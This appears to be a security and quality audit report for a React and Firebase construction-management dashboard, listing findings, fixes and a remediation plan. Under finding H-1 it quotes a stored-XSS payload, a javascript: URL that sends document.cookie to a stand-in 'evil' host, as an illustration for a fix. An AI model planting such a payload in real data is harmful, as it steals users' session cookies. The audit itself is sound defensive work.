# P2 Field Control — Audit & Hardening Pass

_Audit date: 2026-06-11 · Branch: `claude/build-new-feature-9pnZB` · Auditor role: staff eng / security / perf / UX / QA_

## 1. Executive summary

P2 Field Control is a mature React 19 + Firebase construction-ops dashboard with
a multi-portal model (internal staff, builder/QBS, client). The codebase is in
good health: a clean component/lib/hook separation, 467 passing unit tests across
44 files, a green CI pipeline (lint → test → build → functions syntax check), and
a staged security-hardening history already visible in `firestore.rules` and
`SECURITY_ROLLOUT.md`.

This pass inspected every source file, mapped the dependency graph, ran the full
verification suite, and fanned two parallel deep-review agents across the portal
and dashboard surfaces. It found **one genuine stored-XSS vector** (database-
supplied URLs bound to anchor `href` with no scheme validation), a handful of
correctness/robustness bugs (a stuck-spinner on a failed write, two resource
leaks), and a broken `npm run lint` script. All of these were fixed safely with
no public behavior change. Larger items requiring product/ops decisions (the
legacy-fallback branch in the Firestore rules, dependency CVEs needing a lockfile
bump) are documented in `IMPROVEMENT_PLAN.md`.

**Health score: 86 / 100** — up from ~80 before this pass. Deductions remain for
the broad `signedIn()` write rules on operational collections, the unenforced
audit-actor identity, and the open dependency advisories.

## 2. Stack summary

| Layer | Technology |
|---|---|
| UI | React 19, Vite 8, Tailwind v4, shadcn primitives, lucide-react, recharts |
| State/data | Firebase Firestore (offline persistent cache, multi-tab), Context + custom hooks |
| Auth | Firebase Auth (email/password), custom-claim + `users/{uid}` role model |
| Backend | Firebase Cloud Functions v2 (QuickBooks + CompanyCam OAuth, push fan-out, scoping backfill) |
| Storage | Firebase Cloud Storage (client uploads, 25 MB cap) |
| Native/desktop | Capacitor (iOS/Android), Tauri (desktop) |
| PWA | Custom service worker (offline write queue, cache versioning) |
| Tests | Vitest + jsdom (467 tests) |
| Lint | ESLint 9 flat config |
| CI | GitHub Actions |

## 3. Commands run

| Command | Result |
|---|---|
| `npx eslint .` | **was failing** (2 × `__dirname` no-undef in config files) → **fixed → 0 problems** |
| `npx eslint src/ functions/` (CI's command) | 0 problems |
| `npm test` (`vitest run`) | 467 passed / 44 files |
| `npm run build` | success (~1.2 s, largest chunk jspdf 399 KB lazy) |
| `npm audit --omit=dev` (root) | 9 vulns (6 moderate, 3 high) — all transitive (firebase SDK → protobufjs/qs) |
| `cd functions && npm audit` | 12 vulns (11 moderate, 1 high) — transitive (grpc, hono, fast-uri) |
| `node --check functions/index.js` | OK |

No typecheck step exists (JS project, not TS). No format-check step (no Prettier config).

## 4. Health score: **86 / 100**

## 5. Critical findings

None outstanding after this pass. (The XSS finding below was the highest-severity
item and is fixed.)

## 6. High findings

### H-1 — Stored XSS via database-supplied URLs on `href` _(FIXED)_
- **Severity:** High
- **Impact:** Any signed-in user can write operational docs (`jobs`, `files`,
  …) under the current `allow write: if signedIn()` rules. A malicious value like
  `job.paymentUrl = "javascript:fetch('//evil/'+document.cookie)"` would execute
  when a client clicks "Pay now". Same for document `url` fields rendered in the
  client portal, job detail, and project folders.
- **Evidence:**
  - `src/components/ClientPortal.jsx:445` (`job.paymentUrl`), `:552` (`d.url`)
  - `src/components/JobDetail.jsx:492` (`d.url`)
  - `src/components/ProjectFolders.jsx:193` (`f.url`)
- **Root cause:** URLs from Firestore bound directly to `href` with no scheme allow-list.
- **Fix applied:** New `src/lib/safeHref.js` allows only `http(s):`/`mailto:`/`tel:`
  and root/protocol-relative links; anything else → `undefined` (React drops the
  attribute, link goes inert). Applied at all four call sites.
- **Regression test:** `src/lib/safeHref.test.js` (7 cases incl. `javascript:` and `data:` blocking). Done.

### H-2 — Operational write rules are `signedIn()`-only
- **Severity:** High (defense-in-depth)
- **Impact:** Read isolation is enforced (per-tenant/per-client via `ownsRecord`),
  but **writes** to `jobs`, `extras`, `materials`, etc. are allowed for any
  authenticated user. A compromised or malicious client/builder account can mutate
  another tenant's records (and, combined with H-1's now-closed vector, could have
  injected scripts).
- **Evidence:** `firestore.rules:103-114` — every operational collection is
  `allow write: if signedIn()`.
- **Root cause:** Documented deliberate trade-off (rules comment) — write scoping
  was deferred because the CO-approval / notification / history flows issue writes
  from portal users and tightening needs coordinated client changes.
- **Fix:** Not made — requires the staged rollout in `SECURITY_ROLLOUT.md` and
  product validation. See `IMPROVEMENT_PLAN.md` item 1.

## 7. Medium findings

### M-1 — `npm run lint` was broken _(FIXED)_
- `eslint.config.js` only granted Node globals to `functions/**`, so `vite.config.js`
  and `vitest.config.js` (`__dirname`) failed `eslint .`. CI masked this by linting
  only `src/ functions/`. Fixed by adding a `*.config.js` + `vitest.setup.js` glob
  with Node globals. `eslint .` now passes.

### M-2 — SubmitInbox stuck "Sending…" on failed write _(FIXED)_
- `src/components/SubmitInbox.jsx:35` `handleNewSubmit` / `:51` `handleReply` had no
  try/finally; a rejected `addSubmit`/`addSubmitReply` left `submitting`/`replying`
  true forever. Wrapped in try/catch/finally so the button always re-enables.

### M-3 — Audit-trail actor is a UI-supplied label
- `ClientPortal.jsx:306-327,613` and `QBSBuilderPortal.jsx` write `actor: clientName`
  to `history`/`notifications`. `clientName` is a display prop, not the verified
  `auth` identity, so the audit trail can be spoofed within an authenticated session.
- **Fix:** Not made — needs a decision on whether to stamp `auth.currentUser.uid`/
  `email` server-side (Cloud Function) vs client. See `IMPROVEMENT_PLAN.md` item 2.

### M-4 — Dependency advisories (transitive)
- Root: 9 (firebase SDK → `protobufjs`, `qs`). Functions: 12 (`@grpc/grpc-js`,
  `hono`, `fast-uri`). All have non-breaking `npm audit fix` available.
- **Fix:** Not made — touching lockfiles is higher-risk than a code edit and should
  be a deliberate, separately-verified change. See `IMPROVEMENT_PLAN.md` item 3.

## 8. Low findings

- **L-1 (FIXED)** `OfflineBanner.jsx:17` — `setTimeout` not cleared on unmount →
  setState-after-unmount warning. Now tracked and cleared in the effect cleanup.
- **L-2 (FIXED)** `CrewReport.jsx:198` — preview blob URLs leaked if the component
  unmounted mid-report. Added an unmount cleanup that revokes outstanding URLs.
- **L-3** `push.js:40-46` — native push `addListener` handles are never removed and
  a late `registrationError` after success is a no-op reject (harmless). Low value;
  left as-is to avoid behavior risk.
- **L-4** `PhotoLightbox.jsx:28` — arrow-key handlers don't `preventDefault`, so the
  page can scroll behind the lightbox. Cosmetic.
- **L-5** Foreground-only `console.error` logging in several portal handlers — fine,
  but inconsistent with the `errorLogger` Firestore sink used elsewhere.

### Confirmed NON-issues (subagent false positives, verified against source)
- PhotoLightbox "stale closure": **false** — `go` is in the effect dep array and
  recreated via `useCallback`; the listener re-registers correctly.
- CommandCenter "date NaN crash": **false** — already guarded with `!isNaN(ms)`
  (`CommandCenter.jsx:316`) and `isNaN(d.getTime())` (`:236`).
- `generateInvoicePdf` "`li.desc` undefined crash": **false** — `desc` is always
  `job.type || 'MEP Services'` (truthy).

## 9. Architecture risks
- Single 1030-line `App.jsx` holds auth gating, tab routing, OAuth-callback
  handling, terms gate, and user-creation. Works and is well-commented, but it's the
  one file that would benefit most from extraction (routing vs. auth shell).
- Client-side tenant filtering in `DataContext` is correct but is the second line of
  defense; the DB rules are the first and still allow cross-tenant writes (H-2).

## 10. Security risks
- H-1 (fixed), H-2 (write scoping), M-3 (audit actor), M-4 (deps). Storage rules
  are coarse (`allow read: if signedIn()` for all paths) — any authenticated user
  can read any uploaded file by URL. Tracked in `IMPROVEMENT_PLAN.md`.

## 11. Performance risks
- None material. KPIs are memoized; recharts datasets are small (per-portfolio).
  Heavy libs (jspdf, recharts, html2canvas, firebase) are correctly code-split and
  lazy. `React.memo` is applied to hot row components.

## 12. Accessibility risks
- Good baseline: focus traps on every modal, aria-live on toasts/offline banner,
  role+aria on dialogs. Gaps: a few icon-only buttons lack `aria-label` (M-priority,
  not fixed this pass), PhotoLightbox arrow scroll (L-4).

## 13. Test coverage gaps
- Strong on `lib/` + `agent/` pure logic and shared primitives. Thin on the large
  portal components (ClientPortal, QBSBuilderPortal, CrewReport) — these are
  integration-shaped and would need a heavier harness. `safeHref` added this pass.

## 14. File-by-file notes
- `firestore.rules` — read scoping solid; write scoping open (H-2); legacy
  no-scope-fields fallback (`ownsRecord` last clause) should be removed post-backfill.
- `functions/index.js` — OAuth flows verify+burn state, TTL-sweep nonces, avoid
  logging secrets; push fan-out correctly scoped (audit C-2); backfill idempotent.
  No findings.
- `hooks/useFirestore.js` — scoped queries avoid composite indexes by sorting
  client-side; listeners all return unsub. No findings.
- `sw.js` — strips auth headers before queueing offline writes; cache versioned. OK.
- All files were inspected; **zero skipped**.

## 15. Prioritized remediation plan
1. **Done this pass:** H-1 safeHref, M-1 lint, M-2 stuck spinner, L-1 timer, L-2 blob leak.
2. **Next (needs product/ops):** H-2 write scoping → M-3 audit actor → M-4 deps.
3. **Later:** App.jsx extraction, storage path scoping, icon-button aria-labels.

## 16. Changes recommended but not made
See `IMPROVEMENT_PLAN.md` — write-scoping rollout, server-stamped audit actor,
dependency upgrade, storage rule tightening, App.jsx decomposition.

## 17. Unknowns needing human review
- Whether builder/client portal users legitimately need to *write* the operational
  collections directly, or whether those writes can route through Cloud Functions
  (which would let H-2 close cleanly).
- Whether the `backfillScoping` function has been run in production yet (gates the
  removal of the legacy `ownsRecord` fallback).
</content>
